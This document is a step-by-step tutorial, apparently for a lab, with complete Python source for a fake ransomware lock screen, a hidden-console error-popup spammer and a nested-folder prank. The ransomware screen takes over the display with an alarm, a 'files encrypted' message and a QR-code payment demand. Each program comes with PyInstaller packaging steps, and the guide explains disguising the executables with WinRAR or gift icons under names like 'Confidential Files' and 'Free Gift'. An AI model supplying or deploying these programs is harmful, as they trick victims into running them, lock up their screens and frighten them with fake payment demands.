
## MALWARE

### Step 2: Setup your Virtual Environment

To activate:
```bash 
python -m venv venv
```

```bash
venv\Scripts\activate
```
 ### Step 3: Install Required Libraries

```bash
pip install PILLOW ( Ransomware)
```
```bash
python -m PyInstaller --onefile --windowed --add-data "qrc (2).jpg;." --add-data "alert.wav;." rans.py
```
```bash
 pyinstaller --onefile --windowed --icon=winrar.ico --add-data "qrc (2).jpg;." rans.py
```

# Ransomware

## Install PyInstaller
```bash
 pip install pyinstaller
```
```bash
import os
import sys
import time
import json
import random
import datetime
from threading import Thread
from PIL import Image, ImageTk
import tkinter as tk
from tkinter import messagebox
import winsound


def resource_path(filename):
    if getattr(sys, "frozen", False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, filename)


VICTIM_ID = f"SIM-{random.randint(10000, 99999)}"
DURATION = 90

QR_IMAGE = resource_path("qrc (2).jpg")
ALARM_WAV = resource_path("alert.wav")

EVIDENCE_DIR = os.path.join(os.getcwd(), "sim_evidence")
os.makedirs(EVIDENCE_DIR, exist_ok=True)


def generate_iocs():
    ts = datetime.datetime.now().isoformat()
    return [
        {"time": ts, "type": "process", "detail": "ransomware.exe (simulated)"},
        {"time": ts, "type": "file", "detail": "Resume.docx.locked"},
        {"time": ts, "type": "file", "detail": "Vacation.jpg.locked"},
        {"time": ts, "type": "network", "detail": "beacon → 10.10.10.10"}
    ]


def save_iocs(iocs):
    path = os.path.join(EVIDENCE_DIR, f"evidence_{int(time.time())}.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump({
            "victim_id": VICTIM_ID,
            "generated": datetime.datetime.now().isoformat(),
            "iocs": iocs,
            "note": "Simulation only"
        }, f, indent=2)
    return path


def play_alarm():
    if os.path.exists(ALARM_WAV):
        winsound.PlaySound(
            ALARM_WAV,
            winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP
        )


def stop_alarm():
    winsound.PlaySound(None, winsound.SND_PURGE)


def launch_gui():
    root = tk.Tk()
    root.title("Security Alert")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="#4b0000")

    play_alarm()

    def keep_focus():
        while True:
            try:
                root.focus_force()
                root.lift()
            except:
                break
            time.sleep(0.4)

    Thread(target=keep_focus, daemon=True).start()

    canvas = tk.Canvas(root, bg="#4b0000", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
    card_w, card_h = 520, 430

    card = tk.Frame(canvas, bg="#e00012")
    canvas.create_window(
        sw // 2,
        sh // 2,
        window=card,
        width=card_w,
        height=card_h
    )

    header = tk.Frame(card, bg="#ff0020", height=150)
    header.pack(fill="x")

    icon = tk.Canvas(header, width=90, height=90, bg="#ff0020", highlightthickness=0)
    icon.pack(pady=18)
    icon.create_polygon(45, 6, 84, 78, 6, 78, fill="white")
    icon.create_text(45, 56, text="!", fill="black", font=("Segoe UI", 32, "bold"))

    tk.Label(
        header,
        text="You've Been Hacked!",
        bg="#ff0020",
        fg="white",
        font=("Segoe UI", 22, "bold")
    ).pack()

    body = tk.Frame(card, bg="#d10014")
    body.pack(fill="both", expand=True, padx=30, pady=20)

    tk.Label(
        body,
        text="Your files have been encrypted.\nScan the QR code below to restore access.",
        bg="#d10014",
        fg="#ffecec",
        font=("Segoe UI", 12),
        justify="center"
    ).pack(pady=(0, 14))

    if os.path.exists(QR_IMAGE):
        img = Image.open(QR_IMAGE).resize((160, 160), Image.LANCZOS)
        qr = ImageTk.PhotoImage(img)
        lbl = tk.Label(body, image=qr, bg="#d10014")
        lbl.image = qr
        lbl.pack()
    else:
        tk.Label(
            body,
            text="QR CODE NOT FOUND",
            fg="white",
            bg="#d10014",
            font=("Segoe UI", 12, "bold")
        ).pack(pady=40)

    status = tk.Label(
        body,
        text="Awaiting payment...",
        bg="#d10014",
        fg="#ffd16a",
        font=("Consolas", 11)
    )
    status.pack(pady=12)

    def ok_action():
        messagebox.showwarning(
            "Payment Required",
            "No payment detected.\nFiles remain encrypted."
        )

    tk.Button(
        body,
        text="OK",
        command=ok_action,
        bg="#ff4a4a",
        fg="black",
        activebackground="#ff6b6b",
        relief="flat",
        font=("Segoe UI", 12, "bold"),
        width=10,
        pady=6
    ).pack(pady=6)

    def countdown():
        start = time.time()
        while time.time() - start < DURATION:
            remaining = int(DURATION - (time.time() - start))
            status.config(text=f"Time remaining: {remaining}s")
            time.sleep(1)

        status.config(text="Deadline expired. Files lost.")
        stop_alarm()

    Thread(target=countdown, daemon=True).start()

    root.mainloop()


if __name__ == "__main__":
    launch_gui()
```
## Creating a EXE FILE
#### 1. Convert Script to EXE

Prepare the Icon:

#### Go to: https://www.iconarchive.com/
##### Download and Rename the file (example: infecto.ico).
##### Move it to the same folder as your infecto.py.
##### Take note: whatever you name the .ico file is what you must also put in the PyInstaller command.

Paste this: 
```bash
pip install pyinstaller
```
```bash
 pyinstaller --onefile --windowed --icon=winrar.ico --add-data "qrc (2).jpg;." rans.py
```

#### 2. Create the Desktop Shortcut
- Right-click Desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\LAB\InfectoV\dist\infecto.exe
- Right-click the shortcut → Properties → Change Icon
- 
### VIRUS: Fake_error.py
```bash
import random
import time
import win32gui
import win32con
import ctypes
import sys
from threading import Thread

# ===== CONFIG =====
MAX_SPEED = True          # Set to False for less aggressive spamming
HIDE_CONSOLE = True      # Run completely in background
# ==================


ERROR_MESSAGES = [
    "CRITICAL SYSTEM FAILURE: Hoy, magbayad ka na ng utang mo!",
    "VIRUS ALERT: May balance ka pa sa utang mo!",
    "BSOD IMMINENT: 0x0000007B Mabagal ang iyong PC",
    "ERROR: Kulang ka sa tulog at pagmamahal.",
    "WARNING: Nag-ooverheat na CPU mo.",
    "ALERT: Puno na ang memory, i-delete mo na mga screenshot ng ex mo!",
    "SYSTEM32 DELETION IN PROGRESS: 37% complete",
    "CRITICAL: Kailangan ko ng pera, pera, pera",
    "ERROR: May virus na galing sa pag-download ng 'FreeIphone.exe'!",
    "404: Utang na loob, bayaran mo na!",
    "ALERT:  Naubos ang RAM kasi bukas lahat ng tabs ng Chrome!",
    "FATAL ERROR: Storage full, i-delete mo na yung 100 selfies sa jeep!",
]

def show_error():
    """Shows a fake error message"""
    title = random.choice([
        "Microsoft Windows",
        "System Alert",
        "CRITICAL ERROR",
        "Virus Protection",
        "IT Department"
    ])
    
    style = random.choice([
        win32con.MB_ICONERROR | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONINFORMATION | win32con.MB_SYSTEMMODAL
    ])
    
    win32gui.MessageBox(
        0,
        random.choice(ERROR_MESSAGES),
        title,
        style
    )

def hide_console():
    """Completely hides the console window"""
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(),
        0
    )

def main():
    if HIDE_CONSOLE:
        hide_console()
    
    # Calculate delay based on intensity
    delay = 0.1 if MAX_SPEED else random.uniform(0.5, 1.5)
    
    # Main spamming loop
    while True:
        try:
            # Spawn multiple error threads for maximum chaos
            for _ in range(random.randint(1, 3 if MAX_SPEED else 1)):
                Thread(target=show_error).start()
            
            time.sleep(delay)
        except:
            pass

if __name__ == "__main__":
    # Make sure only one instance runs
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "FakeErrorMutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit()
        
        main()
    finally:
        if 'mutex' in locals():
            ctypes.windll.kernel32.CloseHandle(mutex)
```

Run it:
```bash
python fake_error.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: winrar
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into winrar
- Move the winrar.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=error.ico fake_error.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus3\dist\fake_error.exe
- Name it "Confidential Files"

# Virus 3 Infinite Folder

### Step 1: Inside the malware folder add a new folder (vs code) name it virus3

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus3
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: infinitefolder_prank.py.

```bash
import os
import time
import shutil
from threading import Thread

# ===== CONFIG =====
FOLDER_NAME = "FOLDER_INVASION"    # Name of the main folder
DELAY_SECONDS = 0.3                # Speed of appearance (0.3s is optimal)
TOTAL_FOLDERS = 50                 # Total folders to create (stops automatically)
# ==================

def get_desktop_path():
    """Get the correct Desktop path (works with OneDrive too)"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop):
        desktop = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    return desktop

def create_visible_folders():
    """Creates folders that visibly appear on Desktop"""
    desktop = get_desktop_path()
    root_path = os.path.join(desktop, FOLDER_NAME)
    
    # Clear previous run if exists
    if os.path.exists(root_path):
        shutil.rmtree(root_path)
    
    # Create initial folder
    os.makedirs(root_path)
    
    # Create nested folders
    current_path = root_path
    for i in range(1, TOTAL_FOLDERS + 1):
        current_path = os.path.join(current_path, f"FOLDER_{i}")
        os.makedirs(current_path)
        
        # Force folder refresh on Windows
        if os.name == 'nt':
            os.system(f'explorer /select,"{current_path}"')
        
        print(f"Created: {current_path}")  # Console log
        time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("\n=== VISIBLE FOLDER PRANK ===")
    print(f"Creating {TOTAL_FOLDERS} folders on Desktop...\n")
    print("Watch them appear in real-time!")
    print("Press CTRL+C to stop early\n")
    
    try:
        create_visible_folders()
    except KeyboardInterrupt:
        print("\nStopped by user!")
    finally:
        print(f"\nDone! Check your Desktop for '{FOLDER_NAME}'")
        print("To delete: Right-click the folder and select 'Delete'")
```

Run it:
```bash
python infinitefolder_prank.py
```
Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: gift
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into gift
- Move the gift.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=gift.ico infinitefolder_prank.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus2\dist\infinitefolder_prank.exe
- Name it "Free Gift"

